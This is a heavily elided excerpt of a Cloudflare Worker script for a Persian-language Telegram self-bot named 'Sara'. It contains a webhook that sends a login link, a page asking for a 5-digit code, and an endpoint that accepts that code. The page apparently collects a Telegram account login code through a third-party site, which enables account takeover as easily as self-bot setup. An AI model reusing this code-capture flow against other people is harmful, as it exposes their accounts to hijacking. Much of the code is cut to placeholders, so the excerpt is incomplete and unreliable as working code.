...
// ============================================
// 📁 index.js - سارا سلف‌بات کامل با Webhook
// ============================================
  ...
  async fetch(request, env) {
    ...
    if (path === '/webhook') {
      try {
        ...
        console.log('📩 Webhook دریافت شد:', JSON.stringify(update));
        ...
        if (update.message) {
          ...
          if (text === '/start') {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              ...
              body: JSON.stringify({
                chat_id: chatId,
                text: '🌸 سلام! به سارا خوش آمدی!\n\nبرای ورود به لینک زیر برو:\nhttps://sara-self-bot.nova27237.workers.dev/login'
              })
            });
          }
        }
      ...
      return new Response(`
        ...
        <head>
          ...
          <style>
            ...
            input{padding:12px;font-size:18px;border:2px solid #ddd;border-radius:10px;width:80%}
            button{padding:12px 30px;background:#6c5ce7;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer}
          </style>
        </head>
        <body>
          <div class="container">
            <h2>🌸 سارا</h2>
            <p>کد ۵ رقمی رو وارد کن</p>
            <input type="text" id="code" placeholder="کد" maxlength="5">
            <br><br>
            <button onclick="sendCode()">✅ ارسال</button>
            <div id="result"></div>
          </div>
          <script>
    ...
    if (path === '/submitcode' && request.method === 'POST') {
      try {
        ...
        await env.KV_BINDING.put('login_status', 'waiting');
        
        return new Response(JSON.stringify({ 
          success: true, 
          message: '✅ کد ثبت شد! سارا در حال اتصال...' 
        }), {
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (error) {
